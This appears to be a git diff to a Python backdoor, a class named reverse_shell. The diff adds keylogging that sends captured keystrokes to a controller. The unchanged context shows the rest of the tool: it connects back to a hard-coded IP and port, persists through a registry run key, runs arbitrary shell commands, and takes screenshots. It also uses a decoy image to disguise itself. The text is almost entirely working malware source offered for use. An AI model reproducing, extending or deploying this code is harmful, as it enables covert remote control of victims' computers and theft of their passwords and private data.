@@ -11,10 +11,13 @@ import shutil
 import base64
 import requests
 import pyautogui
+import keylogger
 import subprocess
+import threading
 
 class reverse_shell:
-    sock = None
+    sock             = None
+    keylogger_thread = None
     #----------------------------------------------------------------------------------------------------------------------------------------------------
     #copy_me: to copy the executable a different(safe location) & to store it in registry key dir, to run the backdoor whenever victim starts the machine 
     #----------------------------------------------------------------------------------------------------------------------------------------------------   
@@ -42,7 +45,7 @@ class reverse_shell:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
             try:
-                self.sock.connect(("192.168.2.10",54321))
+                self.sock.connect(("192.168.2.9",54321))
                 print "connetion established !"
                 return
             except:
@@ -86,6 +89,13 @@ class reverse_shell:
                 self.reliable_send(base64.b64encode(file_for_upload.read()))
         except:
             self.reliable_send("[error]: no such file")
+    
+    def reply_keylogger_dump(self):
+        try:
+            with open('keylog.txt',"rb") as file_for_upload:
+                self.reliable_send(base64.b64encode(file_for_upload.read()))
+        except:
+            self.reliable_send("[error]: unable to get kelogger dumps")
 
     def reply_upload(self, command):
         uploaded_data = self.reliable_recv()
@@ -95,7 +105,8 @@ class reverse_shell:
     
     def set_proxy_img(self):
         # adding two number calculater 
-        img_path = sys._MEIPASS + "\meme_img.jpg"
+        #img_path = sys._MEIPASS + "\meme_img.jpg"
+        img_path = "meme_img.jpg"
         try:
             temp = [1,2,3]
             print "randown list"
@@ -118,6 +129,8 @@ class reverse_shell:
         while True:
             command = self.reliable_recv()
             if command == "q" or command == "quit" or command == "exit":
+                keylogger.stop_thread()
+                self.keylogger_thread.join()
                 break
             
             elif len(command)>1 and command[:2] == "cd":
@@ -136,6 +149,15 @@ class reverse_shell:
             
             elif len(command)>=10 and command[:10] == "screenshot":
                 self.take_screenshot()
+
+            elif len(command) == 15 and command[:15] == "keylogger_start":
+                print "starting keylogger"
+                self.keylogger_thread = threading.Thread(target = keylogger.start)
+                self.keylogger_thread.start()
+            
+            elif len(command) == 14 and command[:14] == "keylogger_dump":
+                self.reply_keylogger_dump()
+
             else:
                 try:
                     process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
@@ -146,7 +168,6 @@ class reverse_shell:
                     continue
     def close_conn(self):
         self.sock.close()
-
 
 obj = reverse_shell()
 #obj.set_proxy_img()
